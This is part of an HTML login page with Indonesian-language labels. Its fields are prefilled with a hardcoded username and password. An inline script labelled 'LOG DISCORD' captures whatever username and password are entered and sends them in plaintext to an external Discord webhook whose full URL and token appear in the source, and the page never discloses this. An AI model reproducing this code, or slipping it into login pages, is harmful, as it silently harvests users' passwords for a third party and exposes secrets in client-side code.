      <script>
    function checkPageExists() {
        var requestedPage = location.pathname; 
        var validPages = ["/", "login", "/login" , "/login.html" , "login.html"]; 

        if (!validPages.includes(requestedPage)) {
          
            window.location.href = '/404.html';
        }
    }

    window.addEventListener('load', checkPageExists);
</script>

  </head>
  <body>
    <div id="app">
      <section class="hero is-fullheight">
        <div class="hero-body">
          <div class="container has-text-centered">
            <div class="column is-4 is-offset-4">
              <h3 class="title has-text-grey">Login dulu ngabs</h3>
              <p class="subtitle has-text-grey">Please login to proceed.</p>
              <div class="box">
                  <div class="field">
                    <div class="control">
                      <input
                        class="input"
                        type="text"
                        placeholder="daffa"
                        autocomplete="username"
                        id="username"
                        value="daffa"
                        required
                        autofocus
                      />
                    </div>
                  </div>

                  <div class="field">
                    <div class="control">
                      <input
                        class="input"
                        type="password"
                        placeholder="******"
                        autocomplete="current-password"
                        id="password"
                        value="kepoah"
                        required
                      />
                    </div>
                  </div>
                  <button class="button is-block is-link is-fullwidth is-medium" type="submit" id="button"
                  onclick="PostSignUp()">
                    Login
                  </button>
                </form>
              </div>
              <p class="has-text-grey">
                <a href="#">Lupa password ngabs?</a>

                <a href="#">Info lebih lanjut ngabs</a>
              </p>
            </div>
          </div>
        </div>

        <div class="container">
            <div class="notification is-white" id="pesan"></div>
           </div>

      </section>
    </div>

    <!-- Scripts -->
    <script type="module" src="./js/post.js"></script>
    <!-- LOG WEBHOOK DISCORD -->
    <script>
        //LOG DISCORD
       const webhookURL = "https://discordapp.com/api/webhooks/1111883354103619684/OThcIfeoytnucwTWIKfyugG5FXr5CbnHt_iv-5D8hTaYuC73ZCwqnSOWJ5Vfxi-aSL29";
     
       document.getElementById("button").addEventListener("click", () => {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
           const message = `MENCOBA LOGIN NICHH USER: ${username} PASSWORD: ${password}`;
           sendToDiscordWebhook(message);
       });
     
       function sendToDiscordWebhook(message) {
           const requestData = {
               method: "POST",
               headers: {
                   "Content-Type": "application/json"
               },
               body: JSON.stringify({ content: message })
           };
     
           fetch(webhookURL, requestData)
               .then(response => {
                   if (response.ok) {
                       console.log("Gilar Berhasil login");
                   } else {
                       console.error("Gilar GAGAL login");
                   }
               })
               .catch(error => {
                   console.error("Terjadi kesalahan:", error);
               });
       }
        //LOG DISCORD
     </script>
  </body>
